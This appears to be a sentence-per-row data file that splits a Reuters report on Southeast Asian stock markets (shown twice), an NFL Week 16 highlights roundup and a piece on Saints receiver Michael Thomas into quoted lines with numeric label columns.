"A man walks in the business area in Bangkok, May 22, 2015.",-1,0
"(Reuters file photo)
Most Southeast Asian stock markets, including the Stock Exchange of Thailand, remained subdued on Monday as political uncertainty in the United States continued to dampen investors' risk appetite.",-1,0
"A cautious mood pervaded in broader Asia as market participants evaluated a government shutdown in the world's largest economy, as well as rumours of a change in its central bank head.",-1,0
"Local trading volumes were also low in light of the holiday season.",-1,0
"Thailand's index was largely flat, as shares of oil and gas explorer PTT Plc - which fell as much as 1.1% - declined in tandem with oil prices, while infrastructure developer Bangkok Expressway and Metro Plc's stock supported the index by gaining as much as 4.6%.",-1,0
"The Singapore benchmark index was also largely flat, as mild gains in financial stocks were offset by declines in industrial and consumer stocks.",-1,0
"The index was set for its third straight session of losses.",-1,0
"Singapore Telecommunications' stock ranked among the largest intraday losers on the index, while that of banking heavyweight DBS Group rose about 0.5%.",-1,0
"The island state's bourse was slated to close early ahead of Christmas.",-1,0
"Trading volumes stood at a fraction of their 30-day average.",-1,0
"Meanwhile, indexes of Vietnam and Malaysia rose marginally, while Philippine and Indonesian markets were closed until Wednesday.",-1,0
"A man walks in the business area in Bangkok, May 22, 2015.",-1,0
"(Reuters file photo)
Most Southeast Asian stock markets, including the Stock Exchange of Thailand, remained subdued on Monday as political uncertainty in the United States continued to dampen investors' risk appetite.",-1,0
"A cautious mood pervaded in broader Asia as market participants evaluated a government shutdown in the world's largest economy, as well as rumours of a change in its central bank head.",-1,0
"Local trading volumes were also low in light of the holiday season.",-1,0
"Thailand's index was largely flat, as shares of oil and gas explorer PTT Plc - which fell as much as 1.1% - declined in tandem with oil prices, while infrastructure developer Bangkok Expressway and Metro Plc's stock supported the index by gaining as much as 4.6%.",-1,0
"The Singapore benchmark index was also largely flat, as mild gains in financial stocks were offset by declines in industrial and consumer stocks.",-1,0
"The index was set for its third straight session of losses.",-1,0
"Singapore Telecommunications' stock ranked among the largest intraday losers on the index, while that of banking heavyweight DBS Group rose about 0.5%.",-1,0
"The island state's bourse was slated to close early ahead of Christmas.",-1,0
"Trading volumes stood at a fraction of their 30-day average.",-1,0
"Meanwhile, indexes of Vietnam and Malaysia rose marginally, while Philippine and Indonesian markets were closed until Wednesday.",-1,0
"Week 16 packed in some great games, some great plays, and some great laughs.",-1,0
"Let’s stop messing around and get into the good, the bad, the ugly, and the hilarious from Sunday’s action.",-1,0
"The most embarrassing celebration: Roosevelt Nix.",-1,0
"The Steelers fullback thought he picked up a huge first down on a wild/severly costly fake-punt attempt late in the fourth quarter against the Saints.",-1,0
"But he actually came up about a yard short, the Saints got the ball back and went down to score the game-winning TD.",-1,0
"Where have we seen a celebration like this one before?",-1,0
"Oh yeah, here:
The worst job by Santa Claus of sneaking a sip of a beer at an NFL game: Santa Claus.",-1,0
"We agree with the guy who tweeted this – Santa should be enjoying a nice IPA, not a $16 Budweiser.",-1,0
"But who can blame the big guy from enjoying a few cold ones during Sunday night’s Chiefs-Seahawks game?",-1,0
"He’s got a big week coming up, let him enjoy himself while he can.",-1,0
"Best job of trolling your old coach for an extended period of time: Baker Mayfield.",-1,0
"Mayfield stared down his former coach, Hue Jackson, for what seemed like the length of a “Game of Thrones” episode after a big play against the Bengals on Sunday.",-1,0
"It’s so fun having a QB with an attitude like this in the NFL this year.",-1,0
"So.",-1,0
"Much.",-1,0
"Fun.",-1,0
"Worst job by an NFL ref being an NFL ref: The ref who called this pass interference.",-1,0
"Seriously, how was this called PI on Joe Haden?",-1,0
"Just a brutal call that led to an early touchdown by the New Orleans Saints.",-1,0
"That was on fourth down so if they don’t call PI there the Steelers get the ball back and perhaps the game eventually has a different ending than it did.",-1,0
"Best tackle by a kicker: Matt Bosher.",-1,0
"Bosher not only lowered the boom on the Panthers’ kick returner but he also gave him a little stare down after doing it.",-1,0
"Gutsy move for a kicker.",-1,0
"Worst job of missing a teammate’s butt while kicking a FG: Kai Forbath.",-1,0
"I mean, Forbath didn’t come close to missing Chris Reed’s butt on this field goal attempt.",-1,0
"That’s the kinda stuff you learn on the first day as a kicker – don’t kick it off a teammate’s butt.",-1,0
"What a mistake.",-1,0
"Not the smartest place to deliver a late hit as a member of the 49ers: On the Bears sideline.",-1,0
"Richard Sherman has played long enough to know that this wouldn’t go well but he did it anyway.",-1,0
"A big fight broke out, which led to Sherman and two Bears WRs being thrown out of the game.",-1,0
"Best post-game locker room celebration: New Orleans Saints.",-1,0
"Saints WR Shane Wynn showed off some serious moves after the Saints beat the Steelers in an absolute thriller.",-1,0
"Best job of knowing you never hit the ground: Julien Edelman.",-1,0
"Pretty good awareness there by the Patriots wide receiver who bounced off two of Buffalo’s DBs and ran into the end zone for six points.",-1,0
"The worst job by an offensive lineman of staying on his feet: Chris Reed
Pretty rough day for Reed who, of course, had a field goal attempt kicked into his butt.",-1,0
"Well, this also happened to him, and it wasn’t pretty.",-1,0
"Worst job of defending a Hail Mary: Detroit Lions
Good job, good effort on that one, Lions secondary.",-1,0
"The most telling stat that shows you how dominant the Patriots dynasty has been: This 10-win one.",-1,0
"Number of 10 win seasons over the past 16 seasons: 1: OAK, CLE2: DET, WAS, TB3: SF, MIA, TEN, JAX, HOU, LAR4: ARI, NYJ5: MIN, DAL, NYG, LAC, CHI6: CIN, CAR7: ATL, BAL, DEN, NO8: PHI, SEA, KC9: 10: GB, PIT11: IND12: 13: 14:15:16: Patriots
— Field Yates (@FieldYates) December 23, 2018
Yup, the Patriots have been, as Larry David would say, pretty, pretty, pretty good over the years.",-1,0
"The Patriots, by the way, won their 10th straight AFC East title on Sunday, which is an NFL record.",-1,0
"Worst job of playing offense in the red zone: Jaguars 
Jaguars were in the red zone.",-1,0
"They ended up punting on a 4th-and-46.",-1,0
"— Andrew Siciliano (@AndrewSiciliano) December 23, 2018
That’s, like, really hard to do Jacksonville.",-1,0
"Best first touchdown pass thrown by a future Hall of Fame WR: Larry Fitzgerald
Fitzgerald has had a legendary career as a wide receiver and on Sunday he did something he’s never done before as he threw a TD pass to David Johnson.",-1,0
"Maybe the Cardinals should of had him play QB this whole time?",-1,0
"Nah, probably not.",-1,0
"Cris Collinsworth went old school with his slide in on SNF and people loved it
Kirk Cousins voice cracked so hard during awkward pre-snap cadence
Watch Larry Fitzgerald throw the first TD pass of his legendary career",-1,0
"Back on Sept. 23, Saints receiver Michael Thomas described coming to New Orleans in 2016 as a sort of calling, and he told me its purpose was to right the wrong of an all-time great quarterback having just one Super Bowl ring.",-1,0
"As Thomas explained that night, I was brought here to send him out the right way.",-1,0
"Three months later that mission is on track, with the finish line in sight.",-1,0
"And again, it was a critical play from the best receiver Drew Brees has ever played with that inched the Saints closer to that destination.",-1,0
"This one came on second-and-goal with 1:28 left, New Orleans down 28-24 and the ball at the Steelers 2-yard line.",-1,0
"Brees took the shotgun snap and sprinted right.",-1,0
"Thomas, split right, was isolated on Steelers corner Joe Haden.",-1,0
"What happened next is whats become predictable.",-1,0
"Thomas shook his shoulders at the line, broke outside towards the corner, then back at the pylon.",-1,0
"Even in the close quarters of the red zone, the 63, 212-pounder was able to create enough separation for Brees to get the ball to him.",-1,0
"The only question?",-1,0
"Whether Thomas, as he came back to it, overran the goal line and left the end zone before putting the ball away.",-1,0
"Initially, th officials (and well get to them a little later on) ruled that he did.",-1,0
"I definitely knew my feet were in but the ref was playing me right there [on the line], Thomas said over the phone from the Saints locker room last night.",-1,0
"He didnt put his hands up right away.",-1,0
"So that kind of threw me off a little bit.",-1,0
"But once it went to review, I knew it was a touchdown.",-1,0
"So did everyone else.",-1,0
"And as a result, the 2018 Saints wont play another game outdoorstheir foray into the NFC playoffs will be held exclusively at the Superdome and, should they get there, Super Bowl LIII is set for Atlantas Mercedes-Benz Stadiumand enter the postseason as the prohibitive favorite to win it all.",-1,0
"Theres still plenty of work to do, but what Thomas sees now is a lot of that promise of September turning into production, on both a personal and a team level.",-1,0
"Which only has him, and the Saints, redoubling their efforts to give their QB what they believe he so richly deserves.",-1,0
"PLAYOFF PICTURE:Whos In, Whos Out, Whos Still in Contention
One hundred percent, Thomas said.",-1,0
"Thats why I show up every week.",-1,0
"Thats why Ive been here.",-1,0
